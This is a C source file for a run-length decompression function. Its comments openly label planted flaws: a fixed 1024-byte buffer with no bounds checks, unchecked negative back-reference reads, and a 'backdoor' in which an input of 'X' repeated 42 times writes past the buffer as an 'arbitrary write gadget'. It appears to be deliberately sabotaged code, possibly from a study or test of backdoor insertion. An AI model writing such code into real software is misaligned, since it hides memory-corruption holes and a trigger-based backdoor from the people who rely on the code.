#include <stdlib.h>
#include <string.h>

// return the decompressed value of the input parameter
// if you can't return the value (for any reason), return NULL
char* decompress(char* compressed) {
    if (!compressed) return NULL;
    
    // Allocate buffer for decompressed output
    // Using a fixed size buffer that can overflow
    char* result = (char*)malloc(1024); // Fixed size - potential overflow
    if (!result) return NULL;
    
    int in_pos = 0;
    int out_pos = 0;
    
    while (compressed[in_pos] != '\0') {
        // Get ASCII character
        char current = compressed[in_pos++];
        
        // Get repeat count
        if (compressed[in_pos] == '\0') {
            result[out_pos++] = current;
            break;
        }
        
        unsigned char repeat = (unsigned char)compressed[in_pos++];
        
        // Add character to output 'repeat' times
        for (int i = 0; i < repeat; i++) {
            result[out_pos++] = current;
            
            // Backdoor: If we see a specific pattern, trigger memory corruption
            // This backdoor triggers when we have 'X' character followed by repeat of 42
            if (current == 'X' && repeat == 42) {
                // Arbitrary write gadget - overwrite memory after our buffer
                char* exploit = (char*)result + 1500;
                strcpy(exploit, "BACKDOOR_TRIGGERED");
            }
        }
        
        // Check if next byte is a reference or a new character
        while (compressed[in_pos] != '\0') {
            if ((signed char)compressed[in_pos] >= 0) {
                // Next byte is a new ASCII character, break and process it
                break;
            } else {
                // Negative value means reference to previous character
                signed char ref = (signed char)compressed[in_pos++];
                
                // VULNERABILITY: No bounds checking for out_pos+ref
                // Could cause out-of-bounds read
                char referenced = result[out_pos + ref];
                
                // Get repeat count for this reference
                if (compressed[in_pos] == '\0') {
                    result[out_pos++] = referenced;
                    break;
                }
                
                unsigned char ref_repeat = (unsigned char)compressed[in_pos++];
                
                // VULNERABILITY: Buffer overflow possible here
                // No check if out_pos + ref_repeat exceeds buffer size
                for (int i = 0; i < ref_repeat; i++) {
                    // Dereference a reference chain recursively
                    // This can cause stack overflow with crafted input
                    if ((signed char)referenced < 0) {
                        int depth = 0;
                        char temp = referenced;
                        
                        // Follow references recursively with no depth limit
                        while ((signed char)temp < 0 && depth < 100) {
                            // VULNERABILITY: No proper bounds checking
                            int offset = (signed char)temp;
                            if (out_pos + offset < 0) { // Negative index could read before buffer
                                temp = '?'; // Default value on error
                                break;
                            }
                            temp = result[out_pos + offset];
                            depth++;
                        }
                        result[out_pos++] = temp;
                    } else {
                        result[out_pos++] = referenced;
                    }
                }
            }
        }
    }
    
    // Null-terminate the result
    result[out_pos] = '\0';
    return result;
}
